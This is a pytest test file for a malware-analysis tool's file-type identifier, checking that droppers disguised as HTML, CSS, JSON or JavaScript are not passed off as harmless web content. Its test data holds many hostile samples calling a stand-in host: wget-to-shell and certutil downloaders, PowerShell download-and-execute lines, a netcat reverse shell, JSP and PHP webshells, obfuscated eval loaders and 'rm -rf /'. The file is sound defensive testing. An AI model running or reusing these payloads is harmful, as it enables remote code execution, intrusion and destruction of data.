"""Probes: a program dressed as a web file must never get a web kind.

A web kind means "ordinary web content": no hash indicator, no lookup, no links followed. So every
case here tries to look like a page, an image, JSON, a style sheet or the JavaScript of a page while
carrying a command, a downloader or active content, and must keep a non-web kind (`script` or
`text`) whose links are followed. The positive controls keep the guard honest in the other
direction.
"""

from __future__ import annotations

import pytest

from suckerpot_analysis import WEB_KINDS, CompiledRules, Limits, analyze, identify

DROPPER = b"cd /tmp; wget http://192.0.2.1/a; chmod +x a; ./a"

# The cases a reviewer found, verbatim in spirit: each one used to get a web kind.
REVIEWED = {
    "brace group read as json": b"{ true; cd /tmp; wget http://192.0.2.1/a; chmod +x a; ./a; }",
    "test and brace group read as json": (
        b"[ 1 ] && { cd /tmp; wget http://192.0.2.1/a; chmod +x a; ./a; }"
    ),
    "charset line then a dropper": b'@charset "utf-8";\n' + DROPPER,
    "redirect first and an html tag in a comment": (
        b"</dev/null cd /tmp\n# <p>\nwget http://192.0.2.1/a; chmod +x a; ./a\n"
    ),
    "hta": (
        b'<html><head><HTA:APPLICATION ID="x" APPLICATIONNAME="x"/><script language="VBScript">'
        b'Set o = CreateObject("WScript.Shell"): o.Run "mshta http://192.0.2.1/a"</script>'
        b"</head></html>"
    ),
    "jsp webshell": (
        b'<html><body><% Runtime.getRuntime().exec(request.getParameter("c")); %></body></html>'
    ),
    "php short tag": b"<html><body><? system($_GET['c']) ?></body></html>",
    "sct scriptlet": (
        b'<?XML version="1.0"?><scriptlet><registration progid="x" classid="{0}">'
        b'<script language="JScript"><![CDATA[ new ActiveXObject("WScript.Shell").Run("calc"); '
        b"]]></script></registration></scriptlet>"
    ),
    "node with a split module name": (
        b'"use strict";var cp=require("child"+"_process");var f=function(){cp.execSync("id")};f();'
    ),
    "node chmod": (
        b'"use strict";var fs=require("fs");var f=function(){fs.chmodSync("/tmp/a",493)};f();'
    ),
    "wsh active x": (
        b'var sh=new ActiveXObject("WScript.Shell");var f=function(){sh.Run("calc")};f();'
    ),
}

URL = b"http://192.0.2.1/a"
# The second review round: droppers dressed as a page whose first line `<p x` is a failed shell
# redirect, shell and PowerShell scripts whose `let` and `function` lines look like JavaScript,
# Node that loads a module from base64 text, and code built from base64 text.
REVIEWED_AGAIN = {
    "page then python urlretrieve": (
        b"<p x\npython3 -c \"import urllib.request as r;r.urlretrieve('" + URL + b"','/run/a')\"\n"
        b"sh /run/a\n"
    ),
    "page then perl lwp": b"<p x\nperl -MLWP::Simple -e 'getstore(\"" + URL + b'","/run/a")\'\n',
    "page then eval of base64": b'<p x\neval "$(echo d2dldCBodHRwOi8v | base64 -d)"\n',
    "page then curl": b"<p x\ncurl -o /run/a " + URL + b"\nsh /run/a\n",
    "page then wget to a shell": b"<p x\nwget -O- " + URL + b" | sh\n",
    "page then ftpget": b"<p x\nftpget 192.0.2.1 a a\ncat a >x\n./x\n",
    "page then certutil": b"<p x\ncertutil -urlcache -split -f " + URL + b".exe %TEMP%\\a.exe\n",
    "page then bitsadmin": b"<p x\nbitsadmin /transfer j " + URL + b".exe %TEMP%\\a.exe\n",
    "page then iex": b"<p x\niex (New-Object Net.WebClient).DownloadString('" + URL + b".ps1')\n",
    "shell with let lines": (
        b"let a=1\nlet b=2\npython3 -c \"import urllib.request as r;r.urlretrieve('"
        + URL
        + b"','/run/a')\"\n"
    ),
    "shell with function lines": (
        b"function dl() { python3 -c \"import urllib.request as r;r.urlretrieve('$1','$2')\"; }\n"
        b'function run() { sh "$1"; }\ndl ' + URL + b" /run/a\nrun /run/a\n"
    ),
    "powershell functions": (
        b'function Get-P($u) { (New-Object Net.WebClient).DownloadFile($u, "$env:TEMP\\a.exe") }\n'
        b'function Run-P() { Start-Process "$env:TEMP\\a.exe" }\nGet-P \'' + URL + b".exe'\nRun-P\n"
    ),
    "powershell iex of base64": (
        b"function a($x){ iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x))) }\n"
        b"function b(){ a 'aWV4' }\nb\n"
    ),
    "node exec on a module named in base64": (
        b'const h=require("https");const fs=require("fs");h.get("' + URL + b'",r=>r.pipe('
        b'fs.createWriteStream("/run/a")).on("finish",()=>require(Buffer.from('
        b'"Y2hpbGRfcHJvY2Vzcw==","base64").toString()).exec("sh /run/a")));'
    ),
    "function built from atob": b'var p="d2dldCBodHRwOi8v";var f=Function;f(atob(p))();',
    "function of atob, strict": b'"use strict";var p="d2dldA==";var x=function(){};Function(atob(p))();',
    "eval of atob, strict": b'"use strict";var p="d2dldA==";var x=function(){};eval(atob(p));',
    "aliased function, strict": b'"use strict";var p="d2dldA==";var f=Function;f(atob(p))();',
    "node exec with no other sign": (
        b'"use strict";const m=require(process.argv[2]);const f=()=>m.exec("id");f();'
    ),
}

# The third review round: a page whose first line is a failed redirect running `node -e`, the
# Node stage it fetches, other one-line interpreters, sourcing, raw sockets and code built from
# text in JavaScript.
STAGE_TWO = (
    b'const https=require("https");const fs=require("fs");https.get("' + URL + b'/x.arm7",r=>{'
    b'const c=[];r.on("data",d=>c.push(d));r.on("end",()=>{fs.writeFile("/tmp/x",Buffer.concat(c)'
    b',()=>{require(["child","process"].join("_")).fork("/tmp/x")})})});'
)
REVIEWED_THIRD = {
    "page then node -e": (
        b"<b x\nnode -e \"require('https').get('" + URL + b"/s2.js',r=>{let d='';"
        b"r.on('data',c=>d+=c);r.on('end',()=>eval(d))})\"\n"
    ),
    "node stage two": STAGE_TWO,
    "node stage two, strict": b'"use strict";' + STAGE_TWO,
    "page then php -r": b"<p x\nphp -r 'eval(file_get_contents(\"" + URL + b"\"));'\n",
    "page then ruby -e": b'<p x\nruby -e \'require "open-uri";eval(URI.open("'
    + URL
    + b"\").read)'\n",
    "page then source of a socket": b"<p x\nsource <(nc 192.0.2.1 4444)\n",
    "page then bash of a download": b"<p x\nbash <(wget -qO- " + URL + b")\n",
    "page then a sourced file": b"<p x\n. /run/a\n",
    "page then a sourced home file": b"<p x\nsource ~/.a\n",
    "page then udp": b"<p x\nexec 3<>/dev/udp/192.0.2.1/53\n",
    "page then gawk socket": (
        b"<p x\ngawk 'BEGIN{s=\"/inet/tcp/0/192.0.2.1/4444\";while(1){s|&getline c;print c}}'\n"
    ),
    "page then lua -e": b"<p x\nlua -e 'os.execute(\"id\")'\n",
    "js eval of a variable": b'"use strict";var d=atob(x);eval(d);',
    "js indirect eval": b'"use strict";var d=atob(x);(0,eval)(d);',
    "js new Function": b'"use strict";var f=new Function(d);f();',
    "js Function without new": b'"use strict";var d=atob(x);Function(d)();',
    "node static import with a write": (
        b'import https from "https";import fs from "fs";const f=()=>fs.writeFileSync("/tmp/x","");'
    ),
}

# The fourth review round: a polyglot whose first line is a <b> tag with a `src` attribute, which a
# shell runs as a Python here-document and node, and the stage it fetches, which builds a function
# through the constructor of an arrow.
POLYGLOT = (
    b'<b x\nsrc="' + URL + b'/s2.js"\npython3 - "$src" <<\'E\'\nimport sys,urllib.request as r\n'
    b'open("/tmp/s","wb").write(r.urlopen(sys.argv[1]).read())\nE\nnode /tmp/s\n'
)
STAGE_CONSTRUCTOR = b'fetch("' + URL + b'/s3").then(r=>r.text()).then(t=>(()=>0).constructor(t)())'
REVIEWED_FOURTH = {
    "polyglot": POLYGLOT,
    "stage built by a constructor": STAGE_CONSTRUCTOR,
    "stage built by a constructor, strict": b'"use strict";' + STAGE_CONSTRUCTOR,
    "env sh": b"<p x\nenv sh -s < /run/a\n",
    "env bash": b"<p x\n/usr/bin/env bash /run/a\n",
    "bash from a file": b"<p x\nbash</run/a\n",
    "sh here-document": b"<p x\nsh <<'E'\nid\nE\n",
    "ksh": b"<p x\nksh /run/a\n",
    "zsh -c": b"<p x\nzsh -c id\n",
    "dash": b"<p x\ndash /run/a\n",
    "constructor by brackets": b'"use strict";var x=[]["filter"]["constructor"](d)();',
    "constructor of a constructor": b'"use strict";var f=g.constructor.constructor(d);f();',
    "window lookup by concatenation": b'"use strict";var e=window["ev"+"al"];e(d);',
    "self lookup by a variable": b'"use strict";var e=self[a+b];e(d);',
    "globalThis lookup by atob": b'"use strict";globalThis[atob("ZXZhbA==")](d);',
    "perl from its input": b"<p x\nperl - <<'E'\nprint 1\nE\n",
    "python here-document": b"<p x\npython3 <<E\nprint(1)\nE\n",
    "node by path": b"<p x\nnode /tmp/s\n",
}

# Payloads that need no particular word in common, wrapped in each disguise below.
PAYLOADS = {
    "shell dropper": DROPPER,
    "pipe to a shell": b"echo aGk= | base64 -d | sh",
    "powershell": b"powershell -enc AAAA",
    "asp tag": b'<% Runtime.getRuntime().exec("id") %>',
    "php": b'<?php system("id"); ?>',
    "python": b'import os\nos.system("id")',
    "node spawn": b'require("child"+"_process").spawn("sh")',
    "node chmod": b'fs.chmodSync("/tmp/a", 0o755)',
    "wsh": b'new ActiveXObject("WScript.Shell").Run("calc")',
    "perl": b'my $x = "id"; system($x);',
    # Second round: one payload per new sign, each alone.
    "certutil": b"certutil -urlcache -f " + URL + b" a.exe",
    "bitsadmin": b"bitsadmin /transfer j " + URL + b" a.exe",
    "iex": b"iex $x",
    "invoke-expression": b"Invoke-Expression $x",
    "invoke-webrequest": b"Invoke-WebRequest -Uri " + URL,
    "downloadstring": b"$w.DownloadString('" + URL + b"')",
    "downloadfile": b"$w.DownloadFile('" + URL + b"', 'a.exe')",
    "frombase64string": b"[Convert]::FromBase64String($x)",
    "net.webclient": b"$w = New-Object System.Net.WebClient",
    "start-process": b"Start-Process a.exe",
    "base64 -d": b"echo aGk= | base64 -d > /run/a",
    "shell eval": b'eval "$x"',
    "python -c": b"python -c 'print(1)'",
    "python3 -c": b"python3 -c 'print(1)'",
    "perl -e": b"perl -e 'print 1'",
    "perl -M": b"perl -MIO::Socket -e 1",
    "ftpget": b"ftpget 192.0.2.1 a a",
    "urlretrieve": b"urllib.request.urlretrieve(u, p)",
    "lwp": b"use LWP::Simple; getstore(u, p);",
    "node exec": b"require(m).exec(c)",
    "createwritestream": b'r.pipe(fs.createWriteStream("/run/a"))',
    "function(atob": b"Function(atob(p))()",
    # Third round: one payload per new sign, each alone.
    "php -r": b"php -r 'echo 1;'",
    "ruby -e": b"ruby -e 'puts 1'",
    "node -e": b"node -e 'console.log(1)'",
    "process substitution": b"source <(cat /run/a)",
    "dot source": b". /run/a",
    "dev udp": b"echo x >/dev/udp/192.0.2.1/53",
    "gawk inet": b"gawk 'BEGIN{print 1 |& \"/inet/tcp/0/192.0.2.1/1\"}'",
    "eval of a variable": b"eval(d)",
    "new Function": b"new Function(d)()",
    "node write": b'require(m).writeFile("/tmp/x", d)',
    # Fourth round: one payload per new sign, each alone.
    "env sh": b"env sh /run/a",
    "bash redirection": b"bash < /run/a",
    "zsh": b"zsh -c id",
    "arrow constructor": b"(()=>0).constructor(d)()",
    "window concatenation": b'window["ev"+"al"](d)',
    "python from its input": b"python3 - <<E",
    "perl from its input": b"perl - x",
}
DISGUISES = {
    "html": b"<!doctype html><html><head><title>t</title></head><body>hi</body></html>\n",
    "svg": b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"></svg>\n',
    "xml": b'<?xml version="1.0"?><rss version="2.0"><channel/></rss>\n',
    "css": b"/* a */\nbody{margin:0}a{color:red}p{padding:0}\n",
    "css at rule": b'@charset "utf-8";\n',
    "json": b'{"a": 1}\n',
    "js": b'"use strict";var a=function(){return 1};var b=2;\n',
}


@pytest.mark.parametrize("name", sorted(REVIEWED))
def test_reviewed_cases_keep_a_non_web_kind(name: str) -> None:
    assert identify(REVIEWED[name]).kind not in WEB_KINDS


@pytest.mark.parametrize("name", sorted(REVIEWED_AGAIN))
def test_second_round_cases_keep_a_non_web_kind(name: str) -> None:
    assert identify(REVIEWED_AGAIN[name]).kind not in WEB_KINDS, name


@pytest.mark.parametrize("name", sorted(REVIEWED_THIRD))
def test_third_round_cases_keep_a_non_web_kind(name: str, rules: CompiledRules) -> None:
    assert identify(REVIEWED_THIRD[name]).kind not in WEB_KINDS, name
    result = analyze(REVIEWED_THIRD[name], rules=rules)
    assert result.severity != "info", name


@pytest.mark.parametrize("name", sorted(REVIEWED_FOURTH))
def test_fourth_round_cases_keep_a_non_web_kind(name: str, rules: CompiledRules) -> None:
    assert identify(REVIEWED_FOURTH[name]).kind not in WEB_KINDS, name
    assert analyze(REVIEWED_FOURTH[name], rules=rules).severity != "info", name


def test_the_polyglot_chain_keeps_every_next_stage(rules: CompiledRules) -> None:
    first = analyze(POLYGLOT, rules=rules)
    assert [(i.value, i.source) for i in first.iocs if i.kind == "next_url"] == [
        (URL.decode() + "/s2.js", "script_url")
    ]
    second = analyze(STAGE_CONSTRUCTOR, rules=rules)
    assert [(i.value, i.source) for i in second.iocs if i.kind == "next_url"] == [
        (URL.decode() + "/s3", "script_url")
    ]


def test_words_next_to_a_tag_are_not_a_shell() -> None:
    page = b"<!doctype html><html><body><p>Use <b>Bash</b> or bash <br> today.</p></body></html>"
    assert identify(page).kind == "html"
    bundle = b'"use strict";var w=window["webpackJsonp"]=window["webpackJsonp"]||[];var f=()=>w;'
    assert identify(bundle).kind == "javascript"


def test_the_node_stage_two_keeps_its_next_stage(rules: CompiledRules) -> None:
    result = analyze(STAGE_TWO, rules=rules)
    assert [(i.value, i.source) for i in result.iocs if i.kind == "next_url"] == [
        (URL.decode() + "/x.arm7", "script_url")
    ]


def test_code_from_text_that_every_bundle_has_is_not_a_command() -> None:
    for js in (
        b'"use strict";var g=Function("return this")();window.g=g;',
        b"\"use strict\";var g=new Function('return this')();window.g=g;",
        b'"use strict";var r=eval("require");window.r=r;',  # a plain string: the bundler idiom
        b'"use strict";var f=function(a){return a};window.f=f;',
    ):
        assert identify(js).kind == "javascript", js
    page = (
        b"<!doctype html><html><body><script>var re=/x/;re.exec(s);document.write('x');"
        b"</script></body></html>"
    )
    assert identify(page).kind == "html"


@pytest.mark.parametrize("name", sorted(REVIEWED_AGAIN))
def test_second_round_cases_keep_their_links(name: str, rules: CompiledRules) -> None:
    result = analyze(REVIEWED_AGAIN[name], rules=rules)
    assert result.file.kind not in WEB_KINDS
    assert result.severity != "info"


@pytest.mark.parametrize("payload", sorted(PAYLOADS))
@pytest.mark.parametrize("disguise", sorted(DISGUISES))
def test_a_disguise_does_not_hide_a_payload(disguise: str, payload: str) -> None:
    for data in (
        DISGUISES[disguise] + PAYLOADS[payload],
        PAYLOADS[payload] + b"\n" + DISGUISES[disguise],
    ):
        assert identify(data).kind not in WEB_KINDS, (disguise, payload)


@pytest.mark.parametrize("payload", sorted(PAYLOADS))
@pytest.mark.parametrize("disguise", sorted(DISGUISES))
def test_a_payload_far_past_the_header_is_still_found(disguise: str, payload: str) -> None:
    # Past the 4 KiB header read and past the 1 MiB deobfuscation limit: the scan covers it all.
    padding = b" " * (1_200_000)
    data = DISGUISES[disguise] + padding + PAYLOADS[payload]
    assert identify(data).kind not in WEB_KINDS, (disguise, payload)


def test_large_web_files_with_a_payload_at_the_very_end() -> None:
    for disguise in ("html", "js", "css"):
        body = DISGUISES[disguise] + b"/* x */ " * 500_000
        assert identify(body).kind in WEB_KINDS  # control: without the payload it is web
        assert identify(body + b"\n" + DROPPER).kind not in WEB_KINDS


def test_a_dropper_dressed_as_web_content_is_still_followed(rules: CompiledRules) -> None:
    for name, data in REVIEWED.items():
        result = analyze(data, rules=rules, limits=Limits())
        assert result.file.kind not in WEB_KINDS, name
    result = analyze(REVIEWED["brace group read as json"], rules=rules)
    assert [i.value for i in result.iocs] == ["http://192.0.2.1/a"]
    assert result.severity != "info"


# -- structure checks ----------------------------------------------------------------------------


def test_json_must_parse() -> None:
    assert identify(b'{"a": [1, 2, {"b": null}], "c": "x"}').kind == "json"
    assert identify(b'{"a": 1}\nrun_this_now').kind not in WEB_KINDS
    assert identify(b'{"a": 1,}').kind not in WEB_KINDS
    assert identify(b'{"a": ' + b"[" * 100_000 + b"]" * 100_000 + b"}").kind not in WEB_KINDS
    big = b'{"a": "' + b"x" * 3_000_000 + b'"}'  # above the parse limit: no web kind
    assert identify(big).kind not in WEB_KINDS


def test_json_nesting_is_capped_by_a_scan_not_by_the_recursion_limit() -> None:
    assert identify(b"[" * 64 + b"]" * 64).kind == "json"  # the cap itself is allowed
    assert identify(b"[" * 65 + b"]" * 65).kind not in WEB_KINDS
    assert identify(b'{"a":' * 65 + b"1" + b"}" * 65).kind not in WEB_KINDS
    assert identify(b'{"a":' * 64 + b"1" + b"}" * 64).kind == "json"
    # Brackets inside strings are not nesting, whatever their number or their escapes.
    quoted = (
        b'{"a": "'
        + b"[" * 5000
        + b'", "b": "\\"[[[[ ]]]]\\"", "c": ['
        + b",".join([b"{}"] * 10)
        + b"]}"
    )
    assert identify(quoted).kind == "json"
    # A deep input with no closing at all is refused too, and quickly.
    assert identify(b"[" * 200_000).kind not in WEB_KINDS
    assert identify(b'{"a": ' + b"[" * 100_000 + b"]" * 100_000 + b"}").kind not in WEB_KINDS


# -- case: tags and keywords are matched whatever their case ---------------------------------------

MIXED_CASE_PAGES = {
    "upper case document": b"<!DOCTYPE HTML><HTML><HEAD><TITLE>t</TITLE></HEAD><BODY>x</BODY></HTML>",
    "mixed case html": b"<Html><Body>hi</Body></Html>",
    "upper case script tag first": b"<SCRIPT>var a = 1;</SCRIPT>",
    "mixed case script tag first": b"<ScRiPt>var a = 1;</ScRiPt>",
    "upper case svg": b'<SVG xmlns="http://www.w3.org/2000/svg"></SVG>',
    "upper case xml prolog and svg": b'<?XML version="1.0"?><SVG xmlns="x"></SVG>',
    "upper case rss": b'<?XML version="1.0"?><RSS version="2.0"><CHANNEL/></RSS>',
}
MIXED_CASE_ACTIVE = {
    "upper case asp tag": b"<HTML><BODY><% Response.Write(1) %></BODY></HTML>",
    "upper case hta": b"<HTML><HEAD><HTA:APPLICATION ID=x></HEAD></HTML>",
    "mixed case hta": b"<Html><Head><Hta:Application Id=x></Head></Html>",
    "mixed case php short tag": b"<Html><Body><? System($_GET[c]) ?></Body></Html>",
    "upper case scriptlet": b'<?XML version="1.0"?><SCRIPTLET><REGISTRATION progid="x"/></SCRIPTLET>',
    "upper case job": b'<?XML version="1.0"?><JOB><SCRIPT language="JScript"></SCRIPT></JOB>',
    "upper case svg script": b'<SVG><SCRIPT>new ActiveXObject("WScript.Shell")</SCRIPT></SVG>',
    "upper case runat": b'<HTML><BODY RUNAT="SERVER"></BODY></HTML>',
    "upper case jsp": b"<HTML><BODY><JSP:SCRIPTLET>x</JSP:SCRIPTLET></BODY></HTML>",
    "mixed case powershell": b"<html><body>PowerShell -enc AAAA</body></html>",
    "upper case getruntime": b"<HTML><BODY>RUNTIME.GETRUNTIME()</BODY></HTML>",
}


@pytest.mark.parametrize("name", sorted(MIXED_CASE_PAGES))
def test_upper_and_mixed_case_markup_is_still_web_content(name: str) -> None:
    kind = identify(MIXED_CASE_PAGES[name]).kind
    assert kind in WEB_KINDS, (name, kind)


@pytest.mark.parametrize("name", sorted(MIXED_CASE_ACTIVE))
def test_upper_and_mixed_case_active_content_is_refused(name: str) -> None:
    assert identify(MIXED_CASE_ACTIVE[name]).kind not in WEB_KINDS, name


def test_upper_case_css_keywords() -> None:
    assert identify(b"@MEDIA print{A{COLOR:red}B{MARGIN:0}C{PADDING:0}}").kind == "css"
    assert identify(b"@Import url(a.css);\nBODY{Margin:0}").kind == "css"


def test_css_must_be_made_of_rules() -> None:
    sheet = b"a{color:red}b{margin:0}@media (min-width:1px){c{padding:0;margin:0}}"
    assert identify(sheet).kind == "css"
    data_uri = b"a{background:url(data:image/png;base64,iVBORw0KGgo=)}b{margin:0}c{color:#fff}"
    assert identify(data_uri).kind == "css"
    for bad in (
        sheet + b"\nimport os\nos.getcwd()",  # code after the last rule
        sheet + b"\nfoo bar baz;",  # a statement outside a block that is not an at-rule
        b"a{color:red}b{margin:0}c{padding:0} d{ run this }",  # a block without a declaration
        b"a{color:red}b{margin:0}c{padding:0}}",  # an extra closing brace
        b"a{color:red}b{margin:0}c{padding:0 ",  # an unterminated block
    ):
        assert identify(bad).kind not in WEB_KINDS, bad


def test_markup_must_open_like_a_document() -> None:
    assert identify(b"<!-- c --><!doctype html><html><body>x</body></html>").kind == "html"
    assert identify(b'<?xml version="1.0"?><!DOCTYPE svg><svg></svg>').kind == "svg"
    for bad in (
        b"</p>\nwget http://192.0.2.1/a",  # a closing tag cannot open a page
        b"<unknown><p>x</p></unknown>",  # an unknown root
        b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "b">]><svg>&a;</svg>',  # entities
        b'<?xml version="1.0"?><x:stylesheet xmlns:x="urn:x"></x:stylesheet>',
        b"<!-- never closed <html><body>",
    ):
        assert identify(bad).kind not in WEB_KINDS, bad


def test_javascript_needs_a_token_only_javascript_has() -> None:
    # Two JavaScript markers (`let x=`, `function f(`) but nothing only JavaScript has: a shell or
    # PowerShell script, never the `javascript` kind, even with no command in it.
    for script in (
        b"let a=1\nlet b=2\necho $a $b\n",
        b"function f() { echo a; }\nfunction g() { echo b; }\nf\ng\n",
        b"function a($x){ $x }\nfunction b(){ a 1 }\nb\n",
        b"var a = 1\nvar b = 2\n",
    ):
        assert identify(script).kind != "javascript", script
    for js in (
        b"let a=1;let b=2;const f=(x)=>x;",
        b"var a=1;function f(){return a===1}",
        b"var a=1;function F(){};F.prototype.x=1;",
        b"var a=1;function f(){return document.title}",
        b"var a=1;var b=2;module.exports=a;",
        b"'use strict';var a=1;var b=2;",
        b'import a from "./a.js";export default a;',
        b'import{a as b}from"./x.js";const c=function(){return b};export const d=2;',
    ):
        assert identify(js).kind == "javascript", js


def test_the_regular_expression_exec_of_a_page_is_not_a_command() -> None:
    bundle = (
        b'"use strict";var r=/(\\d+)\\.(\\d+)/;function v(e){var t=r.exec(e);return t&&t[1]}'
        b'window.v=v;var m=require("./local.js");module.exports={v:v,m:m};'
    )
    assert identify(bundle).kind == "javascript"
    page = (
        b"<!doctype html><html><body><script>var m=/x/.exec(location.hash);</script></body></html>"
    )
    assert identify(page).kind == "html"
    # The same call next to a Node module load is a command.
    for load in (b'require("child"+x)', b'require("fs")', b"import(m)", b"process.mainModule"):
        assert identify(bundle + b"var z=" + load + b";").kind not in WEB_KINDS, load


def test_other_languages_that_share_a_few_words_with_javascript() -> None:
    python = b"import os\nimport sys\nwindow.a = 1\ndocument.b = 2\ndef f(a):\n    return a\n"
    assert identify(python).kind not in WEB_KINDS
    perl = b"use strict;\nmy $x = 1;\nwindow.a = 1\ndocument.b = 2\n"
    assert identify(perl).kind not in WEB_KINDS


# -- positive controls ---------------------------------------------------------------------------


@pytest.mark.parametrize("disguise", sorted(DISGUISES))
def test_the_disguises_alone_are_web_content(disguise: str) -> None:
    kind = identify(DISGUISES[disguise]).kind
    assert kind in WEB_KINDS, (disguise, kind)


# Words a shell script uses, in files that are not shell scripts: single words are not enough.
INNOCENT_WORDS = {
    "es module with export default and export const": (
        b'import{a as b}from"./x.js";const c=function(){return b};export const d=2;'
        b"export default c;export function e(){return d}\n"
    ),
    "minified js with echo and bash in strings and names": (
        b'var echo=function(e){return e},bash="bash -x echo",sh=1;window.q=function(e){return '
        b"e|sh};window.x=echo(bash);var o={export:1,exports:2,echo:3};\n"
    ),
    "html text that mentions bash and export": (
        b"<!doctype html><html><body><p>Open bash, then export the data and echo it.</p>"
        b"<button>Export</button></body></html>"
    ),
    "css with a charset and a comment about the shell": (
        b'@charset "utf-8";\n/* styles for the shell, the bash prompt and the export button */\n'
        b"body{margin:0}.shell{color:#fff}\n"
    ),
    "json that names a shell": b'{"command": "echo", "shell": "bash", "export": true}\n',
    "xml that mentions echo and export": (
        b'<?xml version="1.0"?><rss version="2.0"><channel><title>echo and export in bash'
        b"</title></channel></rss>"
    ),
}


@pytest.mark.parametrize("name", sorted(INNOCENT_WORDS))
def test_single_shell_words_do_not_make_a_file_a_program(name: str) -> None:
    kind = identify(INNOCENT_WORDS[name]).kind
    assert kind in WEB_KINDS, (name, kind)


def test_the_same_words_as_statements_are_a_program() -> None:
    for statement in (
        b"export PATH=/usr/bin",
        b"bash -c 'id'",
        b"x | sh",
        b"cd /tmp",
        b"cd /dev/shm",
        b"nohup ./a &",
        b"echo a >> /var/tmp/x",
        b"nc -e /bin/sh 192.0.2.1 4444",
        b"true; ./a",
        b"true && ./a",
        b"rm -rf /",
    ):
        for disguise in ("html", "js", "json", "css"):
            data = DISGUISES[disguise] + b"\n" + statement + b"\n"
            assert identify(data).kind not in WEB_KINDS, (disguise, statement)
